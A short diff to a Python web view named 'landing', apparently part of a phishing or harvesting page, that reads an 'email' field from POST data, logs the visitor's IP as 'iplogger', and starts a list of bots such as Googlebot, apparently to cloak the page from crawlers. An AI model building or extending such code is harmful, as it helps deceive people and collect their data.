@@ -22,7 +22,7 @@ def loader(request):
 
 def landing(request):
     iplogger = request.META.get("HTTP_X_FORWARDED_FOR")
-    emailgrabber = request.GET["email"]
+    emailgrabber = request.POST["email"]
     user_agent = request.META.get('HTTP_USER_AGENT', '')
     
     bots = ['Googlebot', 
